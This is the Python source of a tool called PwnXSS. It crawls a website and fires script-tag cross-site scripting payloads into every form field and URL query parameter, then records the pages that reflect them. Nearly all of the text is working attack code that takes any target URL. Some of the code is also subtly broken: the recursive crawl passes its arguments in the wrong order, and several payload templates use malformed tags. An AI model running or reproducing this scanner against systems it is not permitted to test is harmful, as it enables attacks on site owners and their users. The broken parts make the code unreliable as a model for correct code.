crawler.py
import requests
from lib.helper.Log import *
from lib.helper.helper import *
from lib.core import *
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from multiprocessing import Process

class crawler:
	
	visited=[]
	
	@classmethod
	def getLinks(self,base,proxy,headers,cookie):

		lst=[]
	
		conn=session(proxy,headers,cookie)
		text=conn.get(base).text
		isi=BeautifulSoup(text,"html.parser")
	
		
		for obj in isi.find_all("a",href=True):
			url=obj["href"]
			
			
			if urljoin(base,url) in self.visited:
				continue

			elif url.startswith("mailto:") or url.startswith("javascript:"):
				continue
	# :// will check if there any subdomain or any other domain but it will pass directory		
			elif url.startswith(base) or "://" not in url :
				lst.append(urljoin(base,url))
				self.visited.append(urljoin(base,url))
			
		return lst

	@classmethod
	def crawl(self,base,depth,proxy,headers,level,method,cookie):

		urls=self.getLinks(base,proxy,headers,cookie)
		
		for url in urls:
			if url.startswith("https://") or url.startswith("http://"):
				p=Process(target=core.main, args=(url,proxy,headers,level,cookie,method))
				p.start()
				p.join()
				if depth != 0:
					self.crawl(url,depth-1,base,proxy,level,method,cookie)
					
				else:
					break	


helper.py
import requests, json
##### Warna ####### 
N = '\033[0m'
W = '\033[1;37m' 
B = '\033[1;34m' 
M = '\033[1;35m' 
R = '\033[1;31m' 
G = '\033[1;32m' 
Y = '\033[1;33m' 
C = '\033[1;36m' 
##### Styling ######
underline = "\033[4m"
##### Default ######
agent = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'} 
line="—————————————————" 
#####################
def session(proxies,headers,cookie):
	r=requests.Session()
	r.proxies=proxies
	r.headers=headers
	r.cookies.update(json.loads(cookie))
	return r

log.py
from lib.helper.helper import * 
from datetime import datetime
class Log:

	@classmethod
	def info(self,text):
 		print("["+Y+datetime.now().strftime("%H:%M:%S")+N+"] ["+G+"INFO"+N+"] "+text)
 
	@classmethod
	def warning(self,text):
		print("["+Y+datetime.now().strftime("%H:%M:%S")+N+"] ["+Y+"WARNING"+N+"] "+text)

	@classmethod
	def high(self,text):
 		print("["+Y+datetime.now().strftime("%H:%M:%S")+N+"] ["+R+"CRITICAL"+N+"] "+text)


core.py
from lib.helper.helper import *
from random import randint
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from lib.helper.Log import *
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import os

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class core:
    
    @classmethod
    def load_payloads(cls, filename):
        filepath = os.path.join(os.path.dirname(__file__), filename)
        with open(filepath, 'r') as file:
            return [line.strip() for line in file.readlines()]
    
    @classmethod
    def generate(cls, eff):
        FUNCTION = cls.load_payloads('payload1.txt')  # Menggunakan payload1.txt
        if eff == 1:
            return "<script/>" + FUNCTION[randint(0, len(FUNCTION) - 1)] + "<\script\>"
        elif eff == 2:
            return "<\script/>" + FUNCTION[randint(0, len(FUNCTION) - 1)] + "<\\script>"
        elif eff == 3:
            return "<\script\> " + FUNCTION[randint(0, len(FUNCTION) - 1)] + "<//script>"
        elif eff == 4:
            return "<script>" + FUNCTION[randint(0, len(FUNCTION) - 1)] + "<\script/>"
        elif eff == 5:
            return "<script>" + FUNCTION[randint(0, len(FUNCTION) - 1)] + "<//script>"
        elif eff == 6:
            return "<script>" + FUNCTION[randint(0, len(FUNCTION) - 1)] + "</script>"

    @classmethod
    def post_method(cls):
        bsObj = BeautifulSoup(cls.body, "html.parser")
        forms = bsObj.find_all("form", method=True)
        
        for form in forms:
            try:
                action = form["action"]
            except KeyError:
                action = cls.url
                
            if form["method"].lower().strip() == "post":
                Log.warning("Target have form with POST method: " + C + urljoin(cls.url, action))
                Log.info("Collecting form input key.....")
                
                keys = {}
                for key in form.find_all(["input", "textarea"]):
                    try:
                        if key["type"] == "submit":
                            Log.info("Form key name: " + G + key["name"] + N + " value: " + G + "<Submit Confirm>")
                            keys.update({key["name"]: key["name"]})
                        else:
                            Log.info("Form key name: " + G + key["name"] + N + " value: " + G + cls.payload)
                            keys.update({key["name"]: cls.payload})
                    except Exception as e:
                        Log.info("Internal error: " + str(e))
                
                Log.info("Sending payload (POST) method...")
                req = cls.session.post(urljoin(cls.url, action), data=keys)
                if cls.payload in req.text:
                    Log.high("Detected XSS (POST) at " + urljoin(cls.url, req.url))
                    with open("xss.txt", "a") as file:
                        file.write(str(req.url) + "\n\n")
                    Log.high("Post data: " + str(keys))
                else:
                    Log.info("Parameter page using (POST) payloads but not 100% yet...")
    
    @classmethod
    def get_method_form(cls):
        bsObj = BeautifulSoup(cls.body, "html.parser")
        forms = bsObj.find_all("form", method=True)
        
        for form in forms:
            try:
                action = form["action"]
            except KeyError:
                action = cls.url
                
            if form["method"].lower().strip() == "get":
                Log.warning("Target have form with GET method: " + C + urljoin(cls.url, action))
                Log.info("Collecting form input key.....")
                
                keys = {}
                for key in form.find_all(["input", "textarea"]):
                    try:
                        if key["type"] == "submit":
                            Log.info("Form key name: " + G + key["name"] + N + " value: " + G + "<Submit Confirm>")
                            keys.update({key["name"]: key["name"]})
                        else:
                            Log.info("Form key name: " + G + key["name"] + N + " value: " + G + cls.payload)
                            keys.update({key["name"]: cls.payload})
                    except Exception as e:
                        Log.info("Internal error: " + str(e))
                        try:
                            Log.info("Form key name: " + G + key["name"] + N + " value: " + G + cls.payload)
                            keys.update({key["name"]: cls.payload})
                        except KeyError as e:
                            Log.info("Internal error: " + str(e))
                        
                Log.info("Sending payload (GET) method...")
                req = cls.session.get(urljoin(cls.url, action), params=keys)
                if cls.payload in req.text:
                    Log.high("Detected XSS (GET) at " + urljoin(cls.url, req.url))
                    with open("xss.txt", "a") as file:
                        file.write(str(req.url) + "\n\n")
                    Log.high("GET data: " + str(keys))
                else:
                    Log.info("\033[0;35;47m Parameter page using (GET) payloads but not 100% yet...")
        
    @classmethod
    def get_method(cls):
        bsObj = BeautifulSoup(cls.body, "html.parser")
        links = bsObj.find_all("a", href=True)
        for a in links:
            url = a["href"]
            if not (url.startswith("http://") or url.startswith("https://") or url.startswith("mailto:")):
                base = urljoin(cls.url, a["href"])
                query = urlparse(base).query
                if query != "":
                    Log.warning("Found link with query: " + G + query + N + " Maybe a vuln XSS point")
                    
                    query_payload = query.replace(query[query.find("=")+1:len(query)], cls.payload, 1)
                    test = base.replace(query, query_payload, 1)
                    
                    query_all = base.replace(query, urlencode({x: cls.payload for x in parse_qs(query)}))
                    
                    Log.info("Query (GET) : " + test)
                    Log.info("Query (GET) : " + query_all)

                    if not url.startswith("mailto:") and not url.startswith("tel:"):                    
                        _respon = cls.session.get(test, verify=False)
                        if cls.payload in _respon.text or cls.payload in cls.session.get(query_all).text:
                            Log.high("Detected XSS (GET) at " + _respon.url)
                            with open("xss.txt", "a") as file:
                                file.write(str(_respon.url) + "\n\n")
                        else:
                            Log.info("Parameter page using (GET) payloads but not 100% yet...")
                    else:
                        Log.info("URL is not an HTTP url, ignoring")
    
    @classmethod
    def main(cls, url, proxy, headers, payload, cookie, method=2):
    
        print(W + "*"*15)
        cls.payload = payload
        cls.url = url
        
        cls.session = session(proxy, headers, cookie)
        Log.info("Checking connection to: " + Y + url)    
        try:
            ctr = cls.session.get(url)
            cls.body = ctr.text
        except Exception as e:
            Log.high("Internal error: " + str(e))
            return
        
        if ctr.status_code > 400:
            Log.info("Connection failed " + G + str(ctr.status_code))
            return 
        else:
            Log.info("Connection estabilished " + G + str(ctr.status_code))
        
        if method >= 2:
            cls.post_method()
            cls.get_method()
            cls.get_method_form()
            
        elif method == 1:
            cls.post_method()
            
        elif method == 0:
            cls.get_method()
            cls.get_method_form()

pwnxss.py
import argparse
from lib.helper.helper import *
from lib.helper.Log import *
from lib.core import core
from random import randint
from lib.crawler.crawler import *

def check(getopt):
    payload_level = int(getopt.payload_level)
    if payload_level > 6 and getopt.payload is None:
        Log.info("Do you want use custom payload (Y/n)?")
        answer = input("> " + W) 
        if answer.lower().strip() == "y":
            Log.info("Write the XSS payload below")
            payload = input("> " + W)
        else:
            payload = core.generate(randint(1, 6))
    else:
        payload = core.generate(payload_level)
    
    return payload if getopt.payload is None else getopt.payload

def start():
    parse = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter, usage="PwnXSS -u <target> [options]", add_help=False)
    
    pos_opt = parse.add_argument_group("Options")
    pos_opt.add_argument("--help", action="store_true", default=False, help="Show usage and help parameters")
    pos_opt.add_argument("-u", metavar="", help="Target url (e.g. http://testphp.vulnweb.com)")
    pos_opt.add_argument("--depth", metavar="", help="Depth web page to crawl. Default: 2", default=2)
    pos_opt.add_argument("--payload-level", metavar="", help="Level for payload Generator, 7 for custom payload. {1...6}. Default: 6", default=6)
    pos_opt.add_argument("--payload", metavar="", help="Load custom payload directly (e.g. <script>alert(2005)</script>)", default=None)
    pos_opt.add_argument("--method", metavar="", help="Method setting(s): \n\t0: GET\n\t1: POST\n\t2: GET and POST (default)", default=2, type=int)
    pos_opt.add_argument("--user-agent", metavar="", help="Request user agent (e.g. Chrome/2.1.1/...)", default=agent)
    pos_opt.add_argument("--single", metavar="", help="Single scan. No crawling just one address")
    pos_opt.add_argument("--proxy", default=None, metavar="", help="Set proxy (e.g. {'https':'https://10.10.1.10:1080'})")
    pos_opt.add_argument("--about", action="store_true", help="Print information about PwnXSS tool")
    pos_opt.add_argument("--cookie", help="Set cookie (e.g {'ID':'1094200543'})", default='''{"ID":"1094200543"}''', metavar="")
    
    getopt = parse.parse_args()
    Log.info("Starting PwnXSS...")
    if getopt.u:
        core.main(getopt.u, getopt.proxy, getopt.user_agent, check(getopt), getopt.cookie, getopt.method)
        
        crawler.crawl(getopt.u, int(getopt.depth), getopt.proxy, getopt.user_agent, check(getopt), getopt.method, getopt.cookie)
        
    elif getopt.single:
        core.main(getopt.single, getopt.proxy, getopt.user_agent, check(getopt), getopt.cookie, getopt.method)
        
if __name__ == "__main__":
    start()

